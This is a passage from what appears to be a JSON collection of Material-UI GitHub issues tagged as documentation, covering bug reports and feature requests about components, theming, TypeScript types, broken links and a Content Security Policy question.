this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\nWhen using state that is an object (not a string or number), ToggleButtonGroup does not track the selected item correctly. Perhaps the comparison should be a callback, passable via props?\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\nValues should only be added to the list once, and items should be removed when clicked while selected.\r\n\r\nPerhaps the comparison could be determined via a callback passed via props.\r\n## Steps to Reproduce 🕹\r\nhttps://codesandbox.io/s/material-demo-gun9b\r\n\r\nThis is an example that does not use the `exclusive` prop. \r\n\r\n1. Click the buttons\r\n2. Observe in the console that the state list keeps growing with each click. \r\n3. Also observe the buttons do not display as selected. (Overriding the ToggleButton `selected` prop to compare objects fixes this, but does not fix the state list growing in size.)\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\n## Context 🔦\r\nI am attempting to keep track of state using the ToggleButtonGroup and ToggleButton components that is more complex than just a number or string.\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI (lab) | v4.0.0-alpha.48  |\r\n| React       |   16.13.1      |\r\n| Browser     |   Chrome (latest)      |\r\n| TypeScript  |   No   |\r\n"},{"labels":[null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\nThe link to the Popper modifiers documentation on https://material-ui.com/api/popper/ is broken.\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\nThe link in the `modifiers` prop description points to https://github.com/FezVrasta/popper.js/blob/master/docs/_includes/popper-documentation.md#modifiers--object which is a broken link.\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\nThe link should be updated to point to the new location. Because Material-UI is using Popper.js v1.16, I believe this should be one of the following:\r\n\r\n- https://github.com/popperjs/popper-core/blob/master/docs/src/pages/docs/v1/index.mdx#modifiers--object (preferred)\r\n- https://github.com/popperjs/popper-core/blob/v1.16.0/docs/_includes/popper-documentation.md#modifiers--object (specific to v1.16)\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Navigate to https://material-ui.com/api/popper/#props.\r\n2. Click the link with text 'read the modifiers documentation' in the `modifiers` prop description.\r\n"},{"labels":[null,"documentation"],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nThe existing [Theme Provider documentation](https://material-ui.com/styles/advanced/) is misleading. When following the first example there is no mention that the configuration is not actually valid for use with the standard Material UI components.\r\n\r\n## Expected Behavior 🤔\r\n\r\nI should be able to extend the example to start adding components such as `Paper` and `Table`.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n* Take the basic example at https://codesandbox.io/s/hu12l\r\n* Wrap the `DeepChild` component in a `Paper` component\r\n* Demo fails with `theme.shadows` is undefined.\r\n\r\nhttps://codesandbox.io/s/material-demo-xxzs3?file=/demo.js\r\n\r\n## Context 🔦\r\n\r\nI was getting started with using theme providers and they would seemingly break at random with obscure errors when I started using other components such as `Table`. Each time I would dutifully remove all the code I'd added and go back to the basic example that was working and start adding code again.\r\n\r\nI repeated this several times before realising that the example doesn't actually work and you need to perform some other step though its not obvious what step that is. I've been left to assume that I need to use `createMuiTheme` for all themes, even nested ones.\r\n"},{"labels":[null,"documentation"],"text":"I'm seeing an error similar to this issue: https://github.com/mui-org/material-ui/issues/16810 when trying to provide a custom component to the ```<Tab />```  component\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Steps to Reproduce 🕹\r\nhttps://codesandbox.io/s/create-react-app-rjsfs\r\n\r\nSteps:\r\n\r\n1. Press the \"tab\" key\r\n\r\n## Context 🔦\r\n\r\nI'm trying to use Tabs that have both text and a clickable icon"},{"labels":[null,"documentation",null],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nFor my virtualized Autocomplete I use your example from your documentation\r\nWhen I try to do virtual Autocomplete component with properties: multiple, filterSelectedOptions, disableCloseOnSelect and choose an element in the middle of list, after choosing list scrolls up to the top.\r\n\r\n## Expected Behavior 🤔\r\n\r\nVirtual List stays at the same place and don't scrolls up after choosing\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\nExample is here: [Example](https://codesandbox.io/s/material-demo-rnpg0)\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n It's not comfortable, when there are about 100 elements in list\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | latest |\r\n| React       | latest |\r\n| TypeScript  | latest |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nWhen typing in the masked input demo in the documentation, no values are displayed, but I can select what I have input:\r\n![image](https://user-images.githubusercontent.com/27866636/78200112-fa533c80-74d0-11ea-8216-3d30e810a34e.png)\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\nExpect to be able to see my input value.\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Type in react-text-mask and/or react-number-format fields.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.8  |\r\n| React       |         |\r\n| Browser     |  Microsoft Edge  |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":[null,"documentation",null],"text":"In the clipped drawer example, the top of the scroll bar is clipped beneath the header when it overflows (as the example does). An extra child element is added to the top to prevent this from causing content to be hidden beneath the header, but that still leaves the scroll bar flowing beneath the header.\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWhen drawer content overflows, the scroll bar continues beneath the header and is not fully visible.\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe scroll bar appears in it's entirety beneath the header when drawer content overflows in this example.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://material-ui.com/components/drawers/\r\n\r\nScroll to 'clipped under the app bar' and look at it. Optionally add `display: none` to the app bar to see the rest of the scroll bar that's cut off currently.\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\n## Context 🔦\r\n\r\nI believe these examples should provide best practices and be as close to ready out of the box as possible. The cut off scroll bar looks visually unappealing.\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.?.?  |\r\n| Browser     | chrome, firefox  |\r\n"},{"labels":[null,"documentation",null,null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nThe `classes` property is missing from the prop type of CssBaseline and ScopedCssBaseline, while the docs mentioned that the prop should exist: [ScopedCssBaseline API](https://material-ui.com/api/scoped-css-baseline/) and [CssBaseline API](https://material-ui.com/api/css-baseline/)\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n```tsx\r\nconst useStyles = makeStyles({\r\n  root: {\r\n    background: \"yellow\"\r\n  }\r\n});\r\n\r\nexport default function App() {\r\n  const classes = useStyles();\r\n  return (\r\n    <>\r\n      <ScopedCssBaseline classes={{ root: classes.root }}>\r\n        <Typography>Hello from scoped!</Typography>\r\n      </ScopedCssBaseline>\r\n    </>\r\n  );\r\n}\r\n\r\n```\r\nThis example fails the type checking, saying that the `classes` property doesn't exist.\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe previous example should work.\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\nhttps://codesandbox.io/s/polished-leftpad-mmkyz\r\n\r\nSteps:\r\n\r\n1. Create a new React project with material-ui v4.9.7 as a dependency\r\n2. Create a component like the one in the example.\r\n3. A type error should appear.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nI'm trying to add an MUI app to an existing website and don't want to break the styling of the page. ScopedCssBaseline is apparently the solution, but I needed to tweak the base styles.\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.7  |\r\n| React       | 16.3.1 |\r\n| TypeScript  | 3.7.2 |\r\n| @types/react | 16.9.26 |\r\n"},{"labels":["documentation",null,null],"text":"When trying to type or receive this error\r\n\r\nThis demo had a runtime error!\r\n\r\nWe would appreciate it if you report this error directly to our issue tracker.\r\n\r\nTypeError: Cannot read property 'value' of null"},{"labels":["documentation",null,null],"text":"When customizing the theme with custom palette options, using a numerical Material color scale (e.g. `theme.palette.primary[500]` throws a type error, though setting the `500` colour for `primary` is permitted by `PaletteColorOptions`. \r\n\r\n<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nThe following is permitted by the project's type definitions of `PaletteColorOptions`:\r\n\r\n```javascript\r\n// createPallete.d.ts\r\nexport type PaletteColorOptions = SimplePaletteColorOptions | ColorPartial;\r\n\r\n// myTheme.ts\r\nexport const theme = createMuiTheme({\r\n    palette: {\r\n        primary: {\r\n            // permitted by PaletteColorOptions:\r\n            500: '#51C9FF',\r\n    }\r\n});\r\n```\r\n\r\nBut it appears that the type definition for the Theme itself, and specifically for `PaletteColor`, don't permit `ColorPartial`'s:\r\n\r\n```javascript\r\n// createPalette.d.ts\r\n\r\nexport interface PaletteColor {\r\n  light: string;\r\n  main: string;\r\n  dark: string;\r\n  contrastText: string;\r\n}\r\n\r\n// myComponent.tsx\r\n\r\n\r\nconst useStyles = makeStyles((theme: Theme) => ({\r\n    primaryText: {\r\n        // Error: Element implicitly has an 'any' type because expression of type '500' can't be used to index type 'PaletteColor'.\r\n        color: theme.palette.primary[500] \r\n    }\r\n}));\r\n```\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe user should be able to both define a color option for a palette group, then read that colour from the theme.\r\n\r\nI believe this could be solved by defining `PaletteColor` as a union, similar to `PaletteColorOptions`:\r\n\r\n```javascript\r\nexport type PaletteColor = SimplePaletteColor | ColorPartial;\r\n\r\nexport interface SimplePaletteColor {\r\n  light: string;\r\n  main: string;\r\n  dark: string;\r\n  contrastText: string;\r\n}\r\n```\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.7  |\r\n| React       | 16.11.0 |\r\n| Browser     | N/A |\r\n| TypeScript  | 3.8.3 |\r\n| etc.        |         |\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\nWe're going to make a lot of modifications to our theme soon, and I was thinking that it'd be really cool if I could enter a custom theme (JS and all) in the material-ui docs, through an inline editor, and navigate through all the docs with that theme.\r\n\r\nBenefits:\r\n* Previewing and testing custom theming options is a breeze\r\n* Remove all \"customization\" demos from the components, and add a button that loads a pre-defined global theme, which then modifies all demos in real time: \"Try Button with different themes\"\r\n* Potentially improve the interactivity of the customization docs, making theming more aproachable for every one\r\n\r\nThis is obviously a huge effort, but as you can already change the theme colors across the website, maybe there is some infrastructure in place already to do this. "},{"labels":[null,"documentation",null],"text":"The page at https://material-ui.com/components/popover/ has a demo that crashes when using the `anchorPosition.top` and `anchorPosition.left` controls.\r\n\r\nPerhaps https://github.com/mui-org/material-ui/issues/17101 did not actually fix the bug.\r\n\r\n- [ ] The issue is present in the latest release. **??? I'm not sure what release is used on the live website.**\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nClick either the down arrow or up arrow of either `anchorPositon.top` or `anchorPosition.left` twice and the demo crashes with this message:\r\n\r\n>This demo had a runtime error!\r\n>\r\n>We would appreciate it if you report this error directly to our issue tracker.\r\n>\r\n>TypeError: e.target is null\r\n\r\n## Expected Behavior 🤔\r\n\r\nI should be able to change those values more than once and the demo should never crash.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n1. Visit https://material-ui.com/components/popover/\r\n2. Scroll down to Anchor Playground\r\n3. Click either anchorPosition control twice, or click one once, and the other once.\r\n\r\n![2020-03-18 17 50 16](https://user-images.githubusercontent.com/97462/77020439-fce65b80-6940-11ea-8528-5ea4e6eb65e3.gif)\r\n\r\n\r\n## Your Environment 🌎\r\n\r\nFirefox on macOS.\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nThe regular size link text within the documentation is difficult to read due to the low contrast ratio between the background and text color - it uses the secondary green.\r\n\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\nRegular size text links are difficult to read, and fail WCAG 2.0, see test at https://contrast-ratio.com/#%23c6ff00-on-white\r\n\r\n## Expected Behavior 🤔\r\n\r\nRegular size links pass WCAG 2.0, I would suggest use of primary color - https://contrast-ratio.com/#rgb%2833%2C%20150%2C%20243%29-on-white\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. View https://material-ui.com/components/material-icons/#material-icons\r\n2. Observe links within the regular text\r\n\r\n\r\n## Context 🔦\r\n\r\nImprove accessibility of the docs\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\nChrome browser on MacBook Pro"},{"labels":["documentation",null],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nhttps://codesandbox.io/s/material-demo-qjiv5\r\n\r\nThis breaks with the suggested theme object:\r\n\r\n```\r\nconst themeInstance = {\r\n  background: \"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)\"\r\n};\r\n```\r\n\r\nTo fix the `cannot set property type of undefined` error:\r\n\r\n```\r\nconst themeInstance = {\r\n  background: \"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)\",\r\n  palette: {\r\n    type: \"dark\"\r\n  }\r\n};\r\n```\r\n\r\nAnd to fix that error:\r\n```\r\nimport { grey } from '@material-ui/core/colors';\r\n\r\nconst themeInstance = {\r\n  background: \"linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)\",\r\n  palette: {\r\n    type: \"dark\",\r\n    grey\r\n  }\r\n};\r\n```\r\n\r\nand I'm presented with yet another error. I'd expect the theme manager to merge the theme object correctly so that fields aren't missing."},{"labels":[null,"documentation"],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\nWhen searching for a way to make my Typography responsive, I came across **responsiveFontSizes** function, only to be let down by the example provided. \r\nThe example, IMO, is not helpful to anyone who is just starting out with Material-UI.\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\nI think an example needs to be provided where all the options are used with a clear showcase of what happens when a user resizes the browser.\r\n\r\n## Examples 🌈\r\nresponsiveFontSizes example at the time of creating this issue: \r\n![responsiveFontSizes](https://user-images.githubusercontent.com/28098952/76707190-7b4abf80-66ed-11ea-81b5-7e2473595e38.png)\r\n\r\n"},{"labels":["documentation"],"text":"I think it would be helpful to have a sample of the default theme colors in it's docs page.  \r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\n## Examples 🌈\r\n\r\nCurrently the [docs](https://material-ui.com/customization/default-theme/#default-theme) just have the hex code with no preview of the color:\r\n![Screen Shot 2020-03-11 at 2 27 42 PM](https://user-images.githubusercontent.com/40478204/76451577-fdfa1480-63a5-11ea-9aa5-62ba46eb15ab.png)\r\n\r\nI think it would be helpful to have a preview like they do in code editors such as VS code:\r\n![Screen Shot 2020-03-11 at 2 40 11 PM](https://user-images.githubusercontent.com/40478204/76451797-5fba7e80-63a6-11ea-886a-358a8120191f.png)\r\n\r\n## Motivation 🔦\r\n\r\nI reference the default theme a good bit and frequently have to manually search the colors.  I think this would be helpful and save time.\r\n\r\nI'm up for working on this if the maintainers think it's a good idea."},{"labels":[null,"documentation",null],"text":"- [ x] The issue is present in the latest release.\r\n- [ x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nHello,\r\ni'm implementing one autocomplete that call async function to retrive places in the world.\r\nactually when i write a specific address ( ex. \" viale dezza, melegnano\" )\r\nthe api returns a single option ( https://nominatim.openstreetmap.org/search?format=json&addressdetails=1&polygon_svg=1&namedetails=1&q=viale%20dezza,%20melegnano )\r\nand the state is updated, but the options inside the autocomplete select are not updated.\r\n\r\n## Expected Behavior 🤔\r\n\r\nwhen i write a specific address i would like to see the only one option that the api return\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n----- > : https://codesandbox.io/s/recursing-night-m529o\r\n\r\nSteps:\r\n\r\n1. click inside the autocomplete\r\n2. open console\r\n3. write \"Viale dezza, melegnano\"\r\n\r\n## Context 🔦\r\n\r\nautocomplete with react leflet etc.\r\n"},{"labels":["documentation"],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\nJust have second code source example (with sandbox) on the SwipeableDrawer section of the [Drawer page](https://material-ui.com/components/drawers/#drawer).\r\n\r\nThe current one we have has 4 swipeable drawers from each side of the device. This is good to keep, but a lot of applications might only want it to be swiped from one direction for less complication. \r\n\r\nWe could keep the newer version as the prime example, and keep the 4 slides version as secondary.\r\n\r\n<!-- Describe how it should work. -->\r\n\r\n## Examples 🌈\r\nThis is the example I built:\r\nhttps://codesandbox.io/s/material-demo-96r4c\r\n\r\nVery simple set up.\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n\r\n## Motivation 🔦\r\n\r\nJust for developers who want to copy an easier version of it to work from. The current code source is just a little bit complicated in its set up. Took me around 10 + minutes bring it to just one drawer and cleaning up the code.\r\n\r\nThis could lead to including more complicated examples, like a mini variant drawer version (where it remains slightly closed), but it would also only have one drawer.\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n"},{"labels":["documentation"],"text":"Seems strange that the docs site shows `<Box>` components for the `<Typography>` docs:\r\n\r\n![](https://p198.p4.n0.cdn.getcloudapp.com/items/yAuvZzLE/Screen+Shot+2020-03-04+at+3.28.48+PM.png?v=7e26d04233d041fd00a037b56cb43ecb)\r\n\r\nhttps://material-ui.com/system/typography/#typography"},{"labels":["documentation"],"text":"<!-- Link to store is incorrect --> \r\nhttps://material-ui.com/discover-more/related-projects/\r\nDesign Resources\r\n• Sketch: \"Sketch for Material-UI\"\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\"Sketch for Material-UI\"\r\nCurrent link:  https://material-ui.com/store/item/sketch-react/\r\n\r\n## Expected Behavior 🤔\r\nCorrect link: https://material-ui.com/store/items/sketch-react/\r\n\r\n## Steps to Reproduce 🕹\r\nSteps:\r\n1. Go to page https://material-ui.com/discover-more/related-projects/\r\n2. Select \"Sketch for Material-UI\". Goes to page not found\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.5  | Documenation\r\n"},{"labels":[null,"documentation"],"text":"According to the documentation, to support the CSP header, a nonce needs to be added to the style-src directive (https://material-ui.com/styles/advanced/#content-security-policy-csp). However, a number of Material-UI components make use of inline style attributes (e.g. Tabs - https://github.com/mui-org/material-ui/blob/master/packages/material-ui/src/Tabs/Tabs.js#L433). These require the 'unsafe-inline' source (or a hash for each style although this isn't practical). The 'unsafe-inline' source is ignored if a hash or nonce source is set, thus necessitating the removal of the nonce.\r\n\r\nSo generally for Material-UI as I see it, I think one of two things are needed:\r\n1.  Update the CSP documentation for a setup to allow inline style attribute setting (not a great CSP, but would make Material-UIs stance clear on styling then).\r\n2. Set a standard of no inline style attribute setting and we fix them all as bugs.\r\n\r\nWhat do you think? I did an issue search and found this (https://github.com/mui-org/material-ui/issues/13364) suggesting that Material-UI as a whole allows inline style attributes and thus are happy with necessitating a non strict CSP setting. Is this still the case and we're happy with what this means for CSP?"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n[react-number-format](https://github.com/s-yadav/react-number-format) has a customInput prop that allows passing materialui components. A custom implementation of the input component is therefore not required and the [docs/examples](https://material-ui.com/components/text-fields/#textfield) should be updated to reflect this.\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [X] The issue is present in the latest release.\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n"},{"labels":[null,"documentation"],"text":"The `<div className={classes.toolbar} />` component that leads to the styles component `toolbar: theme.mixins.toolbar` is really confusing because you have to go to a different page to figure out that the `theme.mixins.toolbar` is just a 54px margin. It would be more clear to just include a margin. "},{"labels":[null,"documentation"],"text":"There may already be a nice way to do this, but I couldn't find it.\r\n\r\nI'd like to be able to display an Input's FormHelperText only if the input is focused. It should however always display the helperText if it is an error (and override the helperText).\r\n\r\nI believe these are the main possible states:\r\n* If input is `error: true`, display the error helperText\r\n* If input is `error: false`, and input is focused: display the helperText\r\n* If input is `error: false`, and input is not focused: don't display the helperText\r\n* If input is `error: false`, and input is not focused, but something like `alwaysDisplay: true` is set on the `FormHelperText` component, then display the helperText\r\n\r\nExcluded states:\r\n* No helperText provided 